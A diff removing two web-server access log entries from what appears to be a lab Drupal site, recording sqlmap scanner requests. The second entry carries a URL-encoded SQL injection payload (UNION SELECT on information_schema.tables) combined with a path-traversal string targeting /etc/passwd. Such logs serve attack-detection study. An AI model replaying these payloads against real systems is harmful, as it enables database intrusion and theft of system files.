@@ -1,2 +1,0 @@
-192.168.35.129<-->20/Oct/2016:21:47:56<-->GET<-->/?q=node%2F1<-->HTTP/1.1<-->200<-->3338<-->http://www.drupal.vulne.proyecto.mx:80/<-->sqlmap/1.0-dev-nongit-201609290a89 (http://sqlmap.org)
-192.168.35.129<-->20/Oct/2016:21:47:56<-->GET<-->/?q=node%2F1&ITBP%3D1046%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2C2%2C3%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%20..%2F..%2F..%2Fetc%2Fpasswd<-->HTTP/1.1<-->200<-->3449<-->http://www.drupal.vulne.proyecto.mx:80/<-->sqlmap/1.0-dev-nongit-201609290a89 (http://sqlmap.org)
